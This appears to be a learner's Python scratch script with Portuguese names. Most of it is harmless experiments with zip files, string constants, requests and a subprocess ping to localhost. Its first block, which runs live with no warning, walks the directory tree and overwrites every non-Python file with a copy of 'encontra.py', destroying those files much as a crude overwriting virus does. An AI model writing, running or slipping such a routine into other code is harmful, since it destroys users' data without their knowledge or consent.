import os
import shutil
import fnmatch

caminho: str = r"./"

for raiz, directories, files in os.walk(caminho):
    for file in files:
        if not fnmatch.fnmatch(file, '*.py'):
            shutil.copy(os.path.join(raiz, 'encontra.py'),
                        os.path.join(raiz, file))

#import string
#import random
#print(string.hexdigits)
#print(string.printable)
#print(string.punctuation)
#print(string.octdigits)
#print(string.capwords("teste"))
#print("".join(random.choices(string.printable, k=8)))
"""
from zipfile import ZipFile

with ZipFile("teste.zip", "w") as zip:
    for arquivo in os.listdir(caminho):
        if not fnmatch.fnmatch(arquivo, "*.zip"):
            caminho_completo = os.path.join(caminho, arquivo)
            zip.write(caminho_completo, arquivo)

with ZipFile("teste.zip", "r") as zip:
    zip.extractall("descompactado")
"""

"""
import requests
from bs4 import BeautifulSoup
response = requests.get("www.google.com")
html = BeautifulSoup(response.text, "html.parser")
"""

import subprocess

proc = subprocess.run([
    "ping", "127.0.0.1"
], capture_output=True, text=True)

print(proc.stdout)